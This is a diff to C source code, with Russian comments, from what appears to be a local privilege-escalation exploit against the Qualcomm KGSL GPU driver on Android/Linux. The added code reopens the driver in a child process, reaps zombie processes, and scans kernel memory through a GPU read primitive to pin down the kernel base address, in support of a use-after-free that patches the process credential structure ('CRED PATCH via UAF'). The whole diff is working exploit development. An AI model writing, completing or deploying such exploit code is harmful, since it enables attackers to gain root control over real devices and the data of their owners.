@@ -1169,13 +1169,34 @@ static int patch_cred_via_gpu(int fd, uint64_t cred_ptr, uint64_t real_cred_ptr)
 
 static void safe_cred_patch(void)
 {
+    // Дочерний процесс ПЕРЕОТКРЫВАЕТ драйвер для чистого контекста
+    if (fd > 0) close(fd);
+    fd = -1;
+    
+    int retry_open = 15;
+    while (retry_open--) {
+        fd = open(DEV_PATH, O_RDWR | O_CLOEXEC);
+        if (fd >= 0) break;
+        fprintf(stderr, "[CHILD] Waiting for KGSL device release... (%d)\n", retry_open);
+        sleep(1);
+    }
+
+    if (fd < 0) {
+        fprintf(stderr, "[CHILD] [!] Failed to reopen KGSL device\n");
+        gbuf[GBUF_TASK_SPRAY] = 0x1;
+        return;
+    }
+    
+    // Сбрасываем кэшированный контекст
+    g_persistent_ctx_id = 0;
+
     uint64_t task_va = *(uint64_t *)&gbuf[GBUF_TASK_VA];
     uint64_t cred_ptr = *(uint64_t *)&gbuf[GBUF_CRED_PTR];
     int patched = 0;
     uid_t my_uid = getuid();
 
     fprintf(stderr, "[CHILD] ============================================\n");
-    fprintf(stderr, "[CHILD] Starting CRED PATCH via UAF\n");
+    fprintf(stderr, "[CHILD] Starting CRED PATCH via UAF (Clean Context Mode)\n");
     fprintf(stderr, "[CHILD] task_va from gbuf[0xb08]: 0x%lx\n", (unsigned long)task_va);
     fprintf(stderr, "[CHILD] cred_ptr from gbuf[0xb10]: 0x%lx\n", (unsigned long)cred_ptr);
 
@@ -2648,16 +2669,26 @@ restart:;
         }
     }
     
-    // Ждем очистки ресурсов
-    while (waitpid(-1, NULL, WNOHANG) > 0) reaped++;
-    fprintf(stderr, "[+] Reaped %d processes. Waiting for GPU to cool down...\n", reaped);
-    sleep(2); // Даем ядру и драйверу время на очистку
+    // Ждем полной очистки всех зомби-процессов
+    int wait_retry = 100;
+    while (wait_retry--) {
+        int r = waitpid(-1, NULL, WNOHANG);
+        if (r > 0) {
+            reaped++;
+            wait_retry = 100; // Сбрасываем счетчик, если кто-то еще умирает
+        } else if (r == -1 && errno == ECHILD) {
+            break; // Детей больше нет
+        }
+        usleep(10000);
+    }
+    fprintf(stderr, "[+] Reaped %d processes. Waiting for GPU to cool down (5s)...\n", reaped);
+    sleep(5); // Увеличили паузу
 
     // -----------------------------------------------------------------------
     // [13] Kernel address resolution
     // -----------------------------------------------------------------------
-    if (kernel_base == 0) {
-        uint64_t task_va = *(uint64_t *)&gbuf[GBUF_TASK_VA];
+    uint64_t task_va = *(uint64_t *)&gbuf[GBUF_TASK_VA];
+    if (kernel_base == 0 || kernel_base == 0xffffffc000000000ULL) {
         if (task_va != 0) {
             kernel_base = find_kernel_base_from_task_va(task_va);
         }
@@ -2665,6 +2696,22 @@ restart:;
             kernel_base = get_kernel_base();
         }
     }
+    
+    // Если база все еще округленная, попробуем уточнить ее через поиск по памяти
+    if ((kernel_base & 0x0000000000FFFFFFULL) == 0) {
+        fprintf(stderr, "[KERNEL_BASE] Refining base address...\n");
+        uint8_t elf_check[4];
+        for (uint64_t off = 0; off < 0x10000000ULL; off += 0x100000ULL) {
+             if (gpu_read_task_struct(fd, kernel_base + off, elf_check, 4) == 0) {
+                 if (memcmp(elf_check, "\x7fELF", 4) == 0) {
+                     kernel_base += off;
+                     fprintf(stderr, "[KERNEL_BASE] Precise base found at 0x%lx\n", (unsigned long)kernel_base);
+                     break;
+                 }
+             }
+        }
+    }
+
     fprintf(stderr, "[+] Kernel base: 0x%lx\n", (unsigned long)kernel_base);
     *(uint64_t *)&gbuf[GBUF_KBASE] = kernel_base;
 
